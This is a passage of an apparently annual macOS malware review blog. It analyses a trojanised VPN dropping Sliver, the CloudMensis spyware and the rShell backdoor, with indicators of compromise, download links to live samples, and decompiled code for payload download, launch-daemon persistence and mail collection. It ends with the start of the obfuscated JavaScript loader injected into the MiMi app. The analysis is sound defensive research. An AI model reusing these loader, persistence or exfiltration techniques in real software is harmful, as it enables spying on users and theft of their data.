<p>According to its <a class="inlineLink" href="https://github.com/BishopFox/sliver">Github repository</a>, Sliver is, &ldquo;an open source cross-platform adversary emulation/red team framework &hellip;support[ing] C2 over Mutual TLS (mTLS), WireGuard, HTTP(S), and DNS&rdquo;</p>
</div>
<p>As a fully-featured (persistent) implant, Sliver affords a remote attacker, complete control over an infected system. Thus any user infected with this malware, is pretty much owned.</p>
<p>The second binary downloaded and installed by the malicious VPN application is named <code>covid</code>. The  SentinelOne researchers analyzed this binary as well, revealing it is a simple loader module, capable of downloading and executing other payloads directly from memory:</p>
<blockquote>
  "<i>The covid executable reaches out to http[:]//46[.]137.201.254, this time on port 8001...it uses a 'fileless' technique to execute a further payload in-memory, evidenced by the tell-tale signs of NSCreateObjectFileImageFromMemory and NSLinkModule.</i>" -SentinelOne  
</blockquote>
<p>The ability to download and execute other payloads gives the malware unlimited extensibility.
<br></p>
<p>
  <img src="../images/blog/blog_0x71/iocs.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Indicators of Compromise (IoCs):</b></span>
</p>
<p>IoCs for this malware include the following (credit: SentinelOne):</p>
<ul>
<li>
<p>Executable Components:</p>
<ul>
<li>
<p><code>~/covid</code>: <br>
7831806172857a563d7b4789acddc98fc11763aaf3cedf937630b4a9dce31419</p>
</li>
<li>
<p><code>~/.androids/softwareupdated</code>: <br>
d9bba1cfca6b1d20355ce08eda37d6d0bca8cb8141073b699000d05025510dcc</p>
</li>
</ul>
</li>
<li>
<p>Files/Directories:</p>
<ul>
<li><code>~/.androids/</code></li>
<li><code>~/Library/LaunchAgents/com.apple.softwareupdate.plist</code></li>
</ul>
</li>
<li>
<p>Network:</p>
<ul>
<li><code>46.137.201.254</code></li>
</ul>
</li>
</ul>
<br>
<h3 id="-cloudmensis">üëæ <strong><code>CloudMensis</code></strong></h3>
<div class="note">
<p>Leveraging cloud providers for its command &amp; control, <code>CloudMensis</code> exfiltrates items such as documents, keystrokes, and screen shots.</p>
<p>
  <img src="../images/download.png" height="16" style="vertical-align:middle"/>
  <span style="vertical-align:middle">
    Download: <a href="https://github.com/objective-see/Malware/raw/main/CloudMensis.zip"><code>CloudMensis</code></a> (password: <code>infect3d</code>)
  </span>
</p> 
</div>
<p>In July, a researcher (<a href="https://twitter.com/marc_etienne_">Marc-Etienne M.L√©veill√©</a>) from ESET published an detailed report on a, &ldquo;a previously unknown macOS backdoor that spies on users of the compromised Mac and exclusively uses public cloud storage services to communicate back and forth with its operators.&rdquo;</p>
<center>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Malware alert. üëÄ<br><br>Previously unknown macOS <a href="https://twitter.com/hashtag/malware?src=hash&amp;ref_src=twsrc%5Etfw">#malware</a> uses cloud storage as a C&amp;C channel to exfiltrate documents, keystrokes, and screen captures from compromised Macs. Read more about the <a href="https://twitter.com/hashtag/CloudMensis?src=hash&amp;ref_src=twsrc%5Etfw">#CloudMensis</a> spyware detected by <a href="https://twitter.com/hashtag/ESETresearch?src=hash&amp;ref_src=twsrc%5Etfw">#ESETresearch</a>.<a href="https://twitter.com/hashtag/ESET?src=hash&amp;ref_src=twsrc%5Etfw">#ESET</a> <a href="https://twitter.com/hashtag/ProgressProtected?src=hash&amp;ref_src=twsrc%5Etfw">#ProgressProtected</a> <a href="https://twitter.com/hashtag/CloudTechnology?src=hash&amp;ref_src=twsrc%5Etfw">#CloudTechnology</a></p>&mdash; ESET (@ESET) <a href="https://twitter.com/ESET/status/1549380430142504961?ref_src=twsrc%5Etfw">July 19, 2022</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<br>
<p>
<img src="../images/blog/blog_0x53/writeup.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Writeups:</b></span>
</p>
<ul>
<li><a href="https://www.welivesecurity.com/2022/07/19/i-see-what-you-did-there-look-cloudmensis-macos-spyware/">&ldquo;I see what you did there: A look at the CloudMensis macOS spyware&rdquo;</a>
<br></li>
</ul>
<p>
<img src="../images/blog/blog_0x53/infect.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Infection Vector:</b> Unknown</span></p>
<p>The ESET report states that infection vector for CouldMensis remains unknown:</p>
<blockquote>
  "<i>We still do not know how victims are initially compromised by this threat. </i>" -ESET 
</blockquote>
<p>ESET&rsquo;s did find code (in the 1<sup>st<sup>-loader) that would clean up from a Safari sandbox escape. Though this code is no longer invoked and the Safari bug has been long patched, it shows that, at least at one point, <code>CloudMensis</code> was likely deployed via a browser exploit. Thus perhaps CloudMensis is still(?) deployed via this same infection vector, albeit with newer exploit(s).</p>
<p>What is known (and is noted in the ESET report), is that once code execution is gained on a victim machine, that there is a &ldquo;two-stage [installation] process&rdquo;:</p>
<img src="../images/blog/blog_0x71/cmInstall.png"  width="100%" class="center" style="border-radius: 4px;">
 
 <center style="color:#787878; padding-top:5px;">CloudMensis&#39; Installation (credit: ESET)</center>

<p>Of note is that the first stage downloader, retrieves the 2<sup>nd</sup> stage payload (the persistent implant) from a cloud-storage provider. In the method named <code>start</code> one can find the code that downloads and saves the 2<sup>nd</sup>-stage payload to disk. The payload, (named <code>MyExecute</code>) is downloaded from a cloud storage provider named pCloud. It is saved to disk as <code>/Library/WebServer/share/httpd/manual/WindowServer</code>:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#75715e">/* @class AppDelegate */</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>-(<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">start</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>    rax <span style="color:#f92672">=</span> [pCloud alloc];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>    rax <span style="color:#f92672">=</span> [rax init];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span><span>    rax <span style="color:#f92672">=</span> [rax DownloadFile:<span style="color:#e6db74">@&#34;/MyExecute&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9</span><span>    [rax writeToFile:<span style="color:#e6db74">@&#34;/Library/WebServer/share/httpd/manual/WindowServer&#34;</span> atomically:<span style="color:#ae81ff">0x1</span>];    </span></span></code></pre></div>
<br></p>
<p>
  <img src="../images/blog/blog_0x53/persist.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Persistence:</b> Launch Daemon </span>
</p>
<p><code>CloudMensis</code> is installed as a launch daemon. Examining the disassembly of the 1<sup>st</sup>-stage installer, reveals hardcoded strings for both the launch daemon&rsquo;s property list (<code>.com.apple.WindowServer.plist</code>) as well as the launch daemon binary (<code>/Library/WebServer/share/httpd/manual/WindowServer</code>):</p>
<img src="../images/blog/blog_0x71/cmStrings.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Hardcoded Launch Daemon Strings</center>

<p>The key-value pairs for the <code>.com.apple.WindowServer.plist</code> launch daemon property list are created (via a <code>NSMutableDictionary</code>)in the method named <code>start</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#75715e">/* @class AppDelegate */</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>-(<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">start</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    rax <span style="color:#f92672">=</span> [NSMutableDictionary dictionaryWithCapacity:<span style="color:#ae81ff">0x5</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    r13 <span style="color:#f92672">=</span> rax;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>    [r13 setObject:<span style="color:#e6db74">@&#34;com.apple.Windowserver&#34;</span> forKey:<span style="color:#e6db74">@&#34;Label&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">@(</span>YES<span style="color:#ae81ff">)</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>    [r13 setObject:rax forKey:<span style="color:#e6db74">@&#34;RunAtLoad&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>    [r13 setObject:path forKey:<span style="color:#e6db74">@&#34;ProgramArguments&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>    [r13 writeToFile:<span style="color:#e6db74">@&#34;/Library/LaunchDaemons/.com.apple.WindowServer.plist&#34;</span> 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>                                                                atomically:<span style="color:#ae81ff">0x1</span>];</span></span></code></pre></div>
<p>As the <code>RunAtLoad</code> key is set to <code>YES</code> (true) the specified binary (the <code>CloudMensis</code> implant, <code>/Library/WebServer/share/httpd/manual/WindowServer</code>) will be persistently executed by macOS each time the system is (re)booted.
<br></p>
<p>
<img src="../images/blog/blog_0x53/capabilities.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Capabilities:</b> Backdoor
</span>
</p>
<p>The <code>CloudMensis</code> malware, is fully featured backdoor, designed to both spy on and collect a myriad of information about its victims:</p>
<blockquote>
  "<i>The second stage [persistent component] of CloudMensis is ...packed with a number of features to collect information from the compromised Mac. The intention of the attackers here is clearly to exfiltrate documents, screenshots, email attachments, and other sensitive data.</i>" -ESET 
</blockquote>
<p>In order to perform its large range of capabilities, <code>CloudMensis</code> exposes almost 40 commands, command that can be remotely tasked an attacker. The ESET report lists a subset of these commands which include:</p>
<ul>
<li>Screen capture</li>
<li>Process listing</li>
<li>List emails / attachments</li>
<li>Download and execute files</li>
<li>List files on removable storage</li>
<li>Execute commands (and upload output)</li>
</ul>
<div class="note">
As the malware authors did not obfuscate method names, get a list of commands (for example via the strings command, or class-dump). Moreover, this will point the analyst to code that implements each command.
</div>
<br>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

% ./class-dump  CloudMensis/WindowServer
...

@interface functions : NSObject

- (BOOL)EncryptMyFile:(id)arg1 encrypt:(BOOL)arg2 key:(unsigned char)arg3 
                                                      afterDelete:(BOOL)arg4;
- (void)EMAILSearchAndMoveFS;
- (void)SearchAndMoveFS:(id)arg1 removable:(BOOL)arg2;
- (void)ZipAndMoveZS:(id)arg1 prefix:(BOOL)arg2 sizelimit:(BOOL)arg3 
                                          subdir:(BOOL)arg4 afterDelete:(BOOL)arg5;
- (void)GetIpAndCountryCode:(id)arg1;
- (BOOL)CreatePlistFileAt:(id)arg1 withLabel:(id)arg2 exePath:(id)arg3 
                                          exeType:(int)arg4 keepAlive:(BOOL)arg5;
- (void)UploadFileImmediately:(id)arg1 CMD:(int)arg2 delete:(BOOL)arg3;
- (void)ExecuteShellCmdAndUpload:(id)arg1;
- (void)ExecuteCmdAndSaveResult:(id)arg1 saveResult:(BOOL)arg2 
                                                    uploadImmediately:(BOOL)arg3;
- (void)GetFilePropertySHA1:(id)arg1 sha1Result:(char *)arg2;
- (void)MoveToFileStore:(id)arg1 Copy:(BOOL)arg2;

@end

...

@interface screen_keylog : NSObject

- (void)loop_usb;
- (void)keyLogger;
- (id)getScreenShotData;
- (void)searchRemovable;
- (void)keylog;
- (void)runKeyScreenFunc;

@end
</pre>
</div>
<p>One can easily follow the methods names in the malware&rsquo;s disassembly to gain an understanding how each command is implemented. For example, let&rsquo;s look at the <code>EMAILSearchAndMoveFS</code> method, so see how <code>CloudMensis</code> will search for emails on an infected machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#75715e">/* @class functions */</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>-(<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">EMAILSearchAndMoveFS</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    var_128 <span style="color:#f92672">=</span> self;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    rax <span style="color:#f92672">=</span> [NSString stringWithFormat:<span style="color:#e6db74">@&#34;/Users/%@/Library/Mail&#34;</span>, rax];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    r13 <span style="color:#f92672">=</span> [NSURL fileURLWithPath:rax];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    r14 <span style="color:#f92672">=</span> [rax enumeratorAtURL:r13 includingPropertiesForKeys:r14 options:<span style="color:#ae81ff">0x0</span> ...];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    rax <span style="color:#f92672">=</span> [rax countByEnumeratingWithState:<span style="color:#f92672">&amp;</span>var_210 objects:<span style="color:#f92672">&amp;</span>var_B0 count:<span style="color:#ae81ff">0x10</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>    rsi <span style="color:#f92672">=</span> <span style="color:#66d9ef">@selector</span>(MoveToFileStore:Copy:);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>  </span></span></code></pre></div>
<p>In short (as can be seen in the decompilation of the <code>EMAILSearchAndMoveFS</code> method), the malware will enumerate all users&rsquo; <code>Library/Mail</code> directory. All emails (and attachments?) will then be moved into the malware&rsquo;s &ldquo;File Store&rdquo;, and subsequently exfiltrated.</p>
<p>Another (more simple command) is the <code>GetIpAndCountryCode:</code> method that can be tasked by remote attackers in order to geolocation infected systems. Looking at its implementation shows it simply makes a (<code>JSON</code>) request to <code>ipinfo.io</code> (and the parse the response):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#75715e">/* @class functions */</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>-(<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">GetIpAndCountryCode:</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)arg2 {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    r15 <span style="color:#f92672">=</span> [arg2 <span style="color:#66d9ef">retain</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    rax <span style="color:#f92672">=</span> [NSURL URLWithString:<span style="color:#e6db74">@&#34;https://ipinfo.io/json&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    rbx <span style="color:#f92672">=</span> [[NSData dataWithContentsOfURL:rax] <span style="color:#66d9ef">retain</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    <span style="color:#66d9ef">if</span> (rbx <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>            <span style="color:#66d9ef">if</span> (r15 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>                    [rbx writeToFile:r15 atomically:<span style="color:#ae81ff">0x1</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>            }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>            var_58 <span style="color:#f92672">=</span> r15;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>            var_50 <span style="color:#f92672">=</span> rbx;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>            rax <span style="color:#f92672">=</span> [NSJSONSerialization JSONObjectWithData:rbx options:<span style="color:#ae81ff">0x0</span> error:<span style="color:#ae81ff">0x0</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>            ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>  </span></span></code></pre></div>
<div class="note">
<p>Browsing to ipinfo.io/json will return a dictionary with geolocation information based on the ip address of your connection. Assuming the victim isn&rsquo;t using a VPN, this can provide some basis geolocation.</p>
</div>
<p>
  <img src="../images/blog/blog_0x71/iocs.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Indicators of Compromise (IoCs):</b></span>
</p>
<p>IoCs for <code>CloudMensis</code> include the following (credit: ESET):</p>
<ul>
<li>
<p>Executable Components:</p>
<ul>
<li><code>/Library/WebServer/share/httpd/manual/WindowServer</code>: <br>
<code>317ce26cae14dc9a5e4d4667f00fee771b4543e91c944580bbb136e7fe339427</code>
<code>b8a61adccefb13b7058e47edcd10a127c483403cf38f7ece126954e95e86f2bd</code></li>
</ul>
</li>
<li>
<p>Files/Directories:</p>
<ul>
<li><code>/Library/WebServer/</code></li>
<li><code>/Library/LaunchDaemons/.com.apple.WindowServer.plist</code></li>
</ul>
</li>
<li>
<p>Network:</p>
<ul>
<li>Various public cloud providers</li>
</ul>
</li>
</ul>
<p>ESET&rsquo;s <a href="https://www.welivesecurity.com/2022/07/19/i-see-what-you-did-there-look-cloudmensis-macos-spyware/">report</a> on <code>CloudMensis</code> also contains other IoCs, and thus should also be consulted.</p>
<br>
<br>
<h3 id="-rshell">üëæ <strong><code>rShell</code></strong></h3>
<div class="note">
<p>Delivered via a supply-chain attack, this backdoor affords basic, albeit sufficient capabilities to remote attacker.</p>
<p>
  <img src="../images/download.png" height="16" style="vertical-align:middle"/>
  <span style="vertical-align:middle">
    Download: <a href="https://github.com/objective-see/Malware/raw/main/rShell.zip"><code>rShell</code></a> (password: <code>infect3d</code>)
  </span>
</p> 
</div>
<p>In August, researchers from TrendMicro uncovered an APT server hosting a new macOS malware samples named <code>rShell</code>:</p>
<blockquote>
  "<i>We noticed a server hosting ... a malicious Mach-O executable named 'rshell.' [Other malware on the server is] used by Iron Tiger (also known as Emissary Panda, APT27, Bronze Union, and Luckymouse), an advanced persistent threat (APT) group that has been performing cyberespionage for almost a decade, and there have been no reports of this group associated with a tool for Mac operating systems (OS). We analyzed the Mach-O sample and found it to be a new malware family targeting the Mac OS platform.</i>" -TrendMicro 
</blockquote>
<p>&hellip;and perhaps most interesting, turns out the malware was spread via an insidious supply-chain attack!
<br></p>
<p>
<img src="../images/blog/blog_0x53/writeup.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Writeups:</b></span>
</p>
<ul>
<li>
<p><a href="https://blog.sekoia.io/luckymouse-uses-a-backdoored-electron-app-to-target-macos/">&ldquo;LuckyMouse uses a backdoored Electron app to target MacOS&rdquo;</a></p>
</li>
<li>
<p><a href="https://www.trendmicro.com/en_us/research/22/h/irontiger-compromises-chat-app-Mimi-targets-windows-mac-linux-users.html">&ldquo;Iron Tiger Compromises Chat Application Mimi, Targets Windows, Mac, and Linux Users&rdquo;</a></p>
</li>
</ul>
<br>
<p>
<img src="../images/blog/blog_0x53/infect.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Infection Vector:</b> Supply-chain attack</span></p>
<p>Arguably the most interesting aspect of <code>rShell</code> (which itself is a fairly basic backdoor), is its infection vector: a (true) supply-chain attack.</p>
<p>In order to infect macOS users, the APT attacker compromised the servers of a the <code>MiMi</code> instant messaging application &hellip;infecting the legitimate application. Thus users who downloaded <code>MiMi</code> (from the legitimate <code>MiMi</code> website) would become infected when running the application!</p>
<p><img src="../images/blog/blog_0x71/rsMimi.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">The MiMi Website (credit: sekoia.io</center>

<br></p>
<blockquote>
  "MiMi (mimi = ÁßòÂØÜ  = secret in Chinese) is an instant messaging application designed especially for Chinese users ... investigation showed that MiMi chat installers have been compromised to download ...rshell samples for the Mac OS platform. 

 Iron Tiger compromised the [MiMi] server hosting the legitimate installers for this chat application for a supply chain attack.</i>" -TrendMicro 
</blockquote>
<p>As noted by both the TrendMirco and Sekoia researchers (who both analyzed the attack), the <code>MiMi</code> application was subverted by the addition of obfuscated (packed) JavaScript inside the application&rsquo;s <code>electron-main.js</code> file:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span><span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">t</span>){eval(<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">p</span>,<span style="color:#a6e22e">a</span>,<span style="color:#a6e22e">c</span>,<span style="color:#a6e22e">k</span>,<span style="color:#a6e22e">e</span>,<span style="color:#a6e22e">r</span>){<span style="color:#a6e22e">e</span><span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">c</span>){<span style="color:#66d9ef">return</span>(<span style="color:#a6e22e">c</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">a</span><span style="color:#f92672">?</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">:</span><span style="color:#a6e22e">e</span>(parseInt(<span style="color:#a6e22e">c</span><span style="color:#f92672">/</span><span style="color:#a6e22e">a</span>)))<span style="color:#f92672">+</span>((<span style="color:#a6e22e">c</span><span style="color:#f92672">=</span><span style="color:#a6e22e">c</span><span style="color:#f92672">%</span><span style="color:#a6e22e">a</span>)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">35</span><span style="color:#f92672">?</span>String.<span style="color:#a6e22e">fromCharCode</span>(<span style="color:#a6e22e">c</span><span style="color:#f92672">+</span><span style="color:#ae81ff">29</span>)<span style="color:#f92672">:</span><span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">36</span>))};<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#e6db74">&#39;&#39;</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/^/</span>,String)){<span style="color:#66d9ef">while</span>(<span style="color:#a6e22e">c</span><span style="color:#f92672">--</span>)<span style="color:#a6e22e">r</span>[<span style="color:#a6e22e">e</span>(<span style="color:#a6e22e">c</span>)]<span style="color:#f92672">=</span><span style="color:#a6e22e">k</span>[<span style="color:#a6e22e">c</span>]<span style="color:#f92672">||</span><span style="color:#a6e22e">e</span>(<span style="color:#a6e22e">c</span>);<span style="color:#a6e22e">k</span><span style="color:#f92672">=</span>[<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">e</span>){<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">r</span>[<span style="color:#a6e22e">e</span>]}];<span style="color:#a6e22e">e</span><span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>(){<span style="color:#66d9ef">return</span><span style="color:#e6db74">&#39;\\w+&#39;</span>};<span style="color:#a6e22e">c</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>};<span style="color:#66d9ef">while</span>(<span style="color:#a6e22e">c</span><span style="color:#f92672">--</span>)<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">k</span>[<span style="color:#a6e22e">c</span>])<span style="color:#a6e22e">p</span><span style="color:#f92672">=</span><span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#66d9ef">new</span> RegExp(<span style="color:#e6db74">&#39;\\b&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">e</span>(<span style="color:#a6e22e">c</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;\\b&#39;</span>,<span style="color:#e6db74">&#39;g&#39;</span>),<span style="color:#a6e22e">k</span>[<span style="color:#a6e22e">c</span>]);<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">p</span>}(<span style="color:#e6db74">&#39;(9(){0 5=1(&#34;5&#34;);0 h=1(&#34;h&#34;);0 6=1(&#34;6&#34;);0 7=1(&#34;7&#34;);0 